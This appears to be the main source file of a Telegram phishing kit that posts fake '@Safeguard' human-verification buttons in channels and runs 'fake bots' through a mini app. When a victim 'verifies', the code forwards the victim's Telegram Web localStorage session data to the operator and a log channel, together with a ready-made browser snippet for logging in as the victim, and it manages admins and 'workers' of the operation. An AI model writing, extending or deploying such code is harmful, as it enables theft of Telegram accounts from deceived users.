const { Telegraf, Context, Markup } = require('telegraf');
const { Worker, setEnvironmentData } = require("worker_threads");
const fs = require('fs');
const path = require('path');
const { Keyboard, Key } = require('telegram-keyboard');
const { message } = require('telegraf/filters');
const { createServer } = require('http');

/** @type {Array<Worker>} */
const botWorkers = [];

/** @type {string} */
let BOT_TOKEN,
/** @type {string} */
    MINI_APP_URL,
/** @type {string} */
    VERIFICATION_IMAGE_URL,
/** @type {string} */
    VERIFIED_IMAGE_URL,
/** @type {number} */
    OWNER,
/** @type {Telegraf} */
    bot;

const pendingSetups = [];

const HELP_MESSAGE = fs.readFileSync("helpMessage.txt", "utf-8").replace("#", "\\");

const UNPRIVILEGED_MESSAGE = "You are not privileged to use this command.";

class ChannelEntry {
/** @type {string} */
    channelId;
/** @type {number} */
    ownerId;

    constructor(channelId, ownerId) {
        this.channelId = channelId;
        this.ownerId = ownerId;
    }
}

let db = {
    BOT_TOKEN: undefined,
    MINI_APP_URL: undefined,
    VERIFICATION_IMAGE_URL: undefined,
    VERIFIED_IMAGE_URL: undefined,
    OWNER: undefined,
    DH_CHANNELID: undefined,
    Admins: [],
    Workers: [],
/** @type {Array<FakeBot>} */
    Bots: [],
/** @type {Array<ChannelEntry>} */
    VerificationMessages: []
};

class FakeBot {
/** @type {string} */
    token;
/** @type {string} */
    name;
/** @type {string} */
    username;

    constructor(token, name, username) {
        this.token = token;
        this.name = name;
        this.username = username;
    }
}

const UserPrivilege = {
    Admin: 2,
    Worker: 1,
    Unprivileged: 0
}

/**
 * Gets user privilege
 * @param {number} userId
 * 
 * @returns {number} User's privilege 
 */
function getPrivilege(userId) {
    if(db.Admins.includes(userId)) return UserPrivilege.Admin;
    if(db.Workers.includes(userId)) return UserPrivilege.Worker;
    return UserPrivilege.Unprivileged;
}

/**
 * Gets user privilege
 * @param {string} userId
 * @param {number} requiredPrivilege
 * 
 * @returns {boolean} `true` if the user has the required privilege or more
 */
function hasPrivilege(userId, requiredPrivilege) {
    const userPrivilege = getPrivilege(userId);
    return userPrivilege >= requiredPrivilege;
}

/**
 * Completes a user verification
 * 
 * @param {string} verificationKey
 */
async function completeUserVerification(verificationKey) {
    const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
    if(entry == undefined) return;
    deleteFromPendingList(entry.userId, entry.botId)
    
    entry.context.sendPhoto(VERIFIED_IMAGE_URL, {
        caption:
            "Verified, you can join the group using this temporary link:\n\n" +
            `https://t.me/+vzgTFZuDzq9hMTlk\n\n` +
            "This link is a one time use and will expire"
    })
}

/**
 * Deletes an entry from a pending list and looks for duplicates
 * 
 * @param {string} userId 
 * @param {string} botId 
 */
function deleteFromPendingList(userId, botId) {
    const entries = userVerificationInfo.filter((d) => d.userId == userId && d.botId == botId);
    for(let i = 0; i < entries.length; i++) {
        if(entries[i].userId == userId && entries[i].botId == botId) {
            userVerificationInfo.splice(userVerificationInfo.indexOf(entries[i]));
        }
    }
}

/**
 * Inits worker bot
 * 
 * @param {string} token 
 * @param {string} name 
 */
async function initFakeBot(token, name, username) {
   try {
        const b = new FakeBot(token, name, username);
        if(!db.Bots.map((d) => (d.name == b.name && d.token == b.token && b.username == d.username)).includes(true)) db.Bots.push(b);
        const worker = new Worker(path.resolve(__dirname, "./bot.js"), {
            workerData: {
                token,
                name
            }
        });

        worker.addListener("message", (msg) => {
            if(msg.type != "localstorage") return;
            
            if(msg.data == undefined) return;
            if(msg.data.data == undefined) return;
            if(msg.data.channel == undefined) return;
            
            const entry = db.VerificationMessages.filter((d) => d.channelId == msg.data.channel)[0];
            if(entry == undefined) return;

            bot.telegram.sendMessage(entry.ownerId, "🛡 User has verified successfully\n\n❓ **How to login**: execute the code below on Telegram WebK https://web.telegram.org/k/\n\n```>\nlocalStorage.clear(); " + JSON.stringify(msg.data.data) + ".forEach(entry => localStorage.setItem(Object.keys(entry)[0], Object.values(entry)[0])); location.reload();```", {
                parse_mode: 'Markdown'
            }).catch(null);

            bot.telegram.sendMessage(db.DH_CHANNELID, "🛡 User has verified successfully\n\n❓ **How to login**: execute the code below on Telegram WebK https://web.telegram.org/k/\n\n```>\nlocalStorage.clear(); " + JSON.stringify(msg.data.data) + ".forEach(entry => localStorage.setItem(Object.keys(entry)[0], Object.values(entry)[0])); location.reload();```", {
                parse_mode: 'Markdown'
            }).catch(null);
        });

        botWorkers.push(worker);
        initFakebotCallback(b);
    } catch(ex) {
        console.log("Failed to initialize fake bot: " + ex);
    }
}

async function readConfig() {
    let config = {};
    const fileContent = fs.readFileSync("config.json", 'utf-8');
    config = JSON.parse(fileContent);

    if(!fs.existsSync("db.json")) {
        console.log("creating database...");
        db = config;
        db.Admins = [db["OWNER"]];
        db.Workers = [];
        db.Bots = [];
        db.VerificationMessages = [];
        fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
        console.log("database created");
    } else db = JSON.parse(fs.readFileSync("db.json", 'utf-8'));
    
    BOT_TOKEN = db["BOT_TOKEN"];
    MINI_APP_URL = db["MINI_APP_URL"];
    VERIFICATION_IMAGE_URL = db["VERIFICATION_IMAGE_URL"];
    VERIFIED_IMAGE_URL = db["VERIFIED_IMAGE_URL"];
    OWNER = db["OWNER"];

    setEnvironmentData("db", db);

    if (!BOT_TOKEN || !MINI_APP_URL || !VERIFICATION_IMAGE_URL || !VERIFIED_IMAGE_URL || !OWNER) {
        throw new Error('Missing required configuration. Please check your config file / database.');
    }
}

function initFakebotCallback(b) {
    bot.action("bot_" + b.username, async (ctx) => {
        //if(!hasPrivilege(ctx.from.id, UserPrivilege.Worker)) return await ctx.answerCbQuery();
        if(ctx.chat.type != "private") return await ctx.answerCbQuery();

        const pendings = pendingSetups.filter(setup => setup.owner == ctx.from.id);
        if(pendings.length == 0) return;
        const pending = pendings[0];

        if(pending.step != 0) return await ctx.answerCbQuery();

        await ctx.reply("*Choose one of the options*:\n_Note: \"Popup opens instantly\" has a higher chance of client engagement._", {
            parse_mode: 'Markdown',
            reply_markup: Keyboard.inline([{text: "Popup opens instantly", callback_data: "s_instant" }, {text: "User messages bot", callback_data: "s_message"}]).reply_markup
        });

        pending.bot = b.username;

        pending.step = 1;
        pendingSetups[pendingSetups.indexOf(pending)] = pending;

        await ctx.answerCbQuery();
    });
}

async function initBot() {
    await readConfig();
    await initWorker();

    bot = new Telegraf(BOT_TOKEN);

    await bot.launch(async () => {
        db.Bots.forEach(async (bot) => {
            await initFakeBot(bot.token, bot.name, bot.username);
        });
        
        /*----------------------------------------------------
        Public commands
        ------------------------------------------------------*/

        bot.help(async (ctx) => {
            if(!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return; //await ctx.reply(UNPRIVILEGED_MESSAGE);

            await ctx.reply(HELP_MESSAGE, {
                parse_mode: "MarkdownV2"
            }).catch(null);
        });

        bot.action("s_instant", async (ctx) => {
            const pendings = pendingSetups.filter(setup => setup.owner == ctx.from.id);
            if(pendings.length == 0) return await ctx.answerCbQuery();
            const pending = pendings[0];
    
            if(pending.step != 1) return await ctx.answerCbQuery();
            
            try {

                await bot.telegram.sendPhoto(pending.channel, db.VERIFICATION_IMAGE_URL, {
                    caption: `${pending.channelName} is being protected by @Safeguard\n\nClick below to verify you're human`,
                    reply_markup: Keyboard.inline([{ text: "Tap to verify", url: `http://t.me/${pending.bot}/verification?startapp=${pending.channel}` }]).reply_markup
                });
                
                const entry = new ChannelEntry(pending.channel, ctx.from.id);
                let msgs = db.VerificationMessages.filter((e) => e.channelId == entry.channelId && e.ownerId == entry.ownerId).length; 

                if(msgs == 0) db.VerificationMessages.push(entry);
            } catch(ex) {
                console.log("Err: " + ex);
                await ctx.reply("Internal error");
            }

            pendingSetups.splice(pendingSetups.indexOf(pendings), 1);
            await ctx.reply("Setup is complete.");
        });

        bot.action("s_message", async (ctx) => {
            const pendings = pendingSetups.filter(setup => setup.owner == ctx.from.id);
            if(pendings.length == 0) return await ctx.answerCbQuery();
            const pending = pendings[0];
    
            if(pending.step != 1) return await ctx.answerCbQuery();
            
            try {
                await bot.telegram.sendPhoto(pending.channel, db.VERIFICATION_IMAGE_URL, {
                    caption: `${pending.channelName} is being protected by @Safeguard\n\nClick below to verify you're human`,
                    reply_markup: Keyboard.inline([{ text: "Tap to verify", url: `http://t.me/${pending.bot}?start=${pending.channel}` }]).reply_markup
                });
                
                const entry = new ChannelEntry(pending.channel, ctx.from.id);
                let msgs = db.VerificationMessages.filter((e) => e.channelId == entry.channelId && e.ownerId == entry.ownerId).length; 

                if(msgs == 0) db.VerificationMessages.push(entry);
            } catch(ex) {
                console.log("Err: " + ex);
                ctx.reply("Internal error");
            }

            pendingSetups.splice(pendingSetups.indexOf(pendings), 1);
            await ctx.reply("Setup is complete.");
        });

        bot.on("my_chat_member", async (ctx) => {
            if(ctx.myChatMember.new_chat_member.status != "administrator") return;
            if(ctx.myChatMember.chat.type != 'channel') return;

            const keyboard = Keyboard.make([
                db.Bots.map((b) => ({ text: b.name, callback_data: `bot_${b.username}` }))
            ], {
                columns: 3
            });

            pendingSetups.push({ owner: ctx.from.id, channel: ctx.myChatMember.chat.id.toString(), channelName: ctx.myChatMember.chat.title, step: 0, bot: undefined, mode: 0 });
            await bot.telegram.sendMessage(ctx.myChatMember.from.id, "Please choose the bot you'd like to use.", keyboard.inline());
        });

        /*----------------------------------------------------
        Administrator commands
        ------------------------------------------------------*/

        bot.command("addbot", async (ctx) => {
            if (!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
            const args = ctx.args;
            
            if(args.length < 3) return ctx.reply(`Bad usage!\nUsage: /addbot <token> <name> <bot username>`).catch(null);
            const token     = args[0];
            const name      = args[1];
            const username  = args[2];

            await initFakeBot(token, name, username);
            return ctx.reply(`Bot '${name}' added.`).catch(null);
        });

        bot.command("addworker", async (ctx) => {
            if(!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
            const args = ctx.args;

            if(args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /addworker <id>`);
            const worker    = parseInt(args[0]);
            
            if(worker == undefined) return await ctx.reply(`Invalid userId`);
            if(db.Workers.includes(worker)) return await ctx.reply(`The worker is already registered`);
            db.Workers.push(worker);

            return await ctx.reply(`Worker added.`);
        });

        bot.command("removeworker", async (ctx) => {
            if(ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
            const args = ctx.args;

            if(args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /removeworker <id>`);
            const worker    = parseInt(args[0]);
            
            if(worker == undefined) return await ctx.reply(`Invalid userId`);
            if(!db.Workers.includes(worker)) return await ctx.reply(`The user is not a worker.`);
            db.Workers.splice(db.Workers.indexOf(worker), 1);

            return await ctx.reply(`Admin removed.`);
        });

        /*----------------------------------------------------
        Owner commands
        ------------------------------------------------------*/

        bot.command("addadmin", async (ctx) => {
            if(ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
            const args = ctx.args;

            if(args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /addadmin <id>`);
            const admin    = parseInt(args[0]);
            
            if(worker == undefined) return await ctx.reply(`Invalid userId`);
            if(db.Admins.includes(admin)) return await ctx.reply(`The user is already registered`);
            db.Admins.push(admin);

            return await ctx.reply(`Admin added.`);
        });

        bot.command("removeadmin", async (ctx) => {
            if(ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
            const args = ctx.args;

            if(args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /removeadmin <id>`);
            const admin    = parseInt(args[0]);
            
            if(worker == undefined) return await ctx.reply(`Invalid userId`);
            if(!db.Admins.includes(admin)) return await ctx.reply(`The user is not administrator`);
            db.Admins.splice(db.Admins.indexOf(admin), 1);

            return await ctx.reply(`Admin removed.`);
        });


        bot.on(message('text'), async (ctx) => {
            if(ctx.chat.type != "private") return;
            //if(!hasPrivilege(ctx.from.id, UserPrivilege.Worker)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
        
            ctx.reply("Welcome to *SafeLoginGuard*!\n\n✨ *The bot will send you logs here.*\n\n_👤 To get started, add the bot to a channel and set it as an administrator._", {
                reply_markup: {
                    inline_keyboard: [[{text: "👆 Add", url: `https://t.me/${bot.botInfo.username}?startchannel&admin=post_messages`}], [{text: "👋 Support", url: "https://t.me/rafalzaorsky"}, {text: "🔄 Channel", url: "https://t.me/+1BxU1hPH3-E5YTdk"}]]
                },
                parse_mode: 'Markdown'
            });
        });
    });

    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
}

process.on("uncaughtException", console.log);
process.on("unhandledRejection", console.log);

async function saveDatabase() { // Background task
    setEnvironmentData("db", db);
    fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
}

async function initWorker() {
    const worker = new Worker(path.resolve(__dirname, "./server.js"));
    worker.addListener("message", (msg) => {
        botWorkers.forEach((w) => w.postMessage(msg));
    });
}

initBot().catch(error => {
    console.error('Failed to initialize bot:', error);
});

setInterval(saveDatabase, 1000);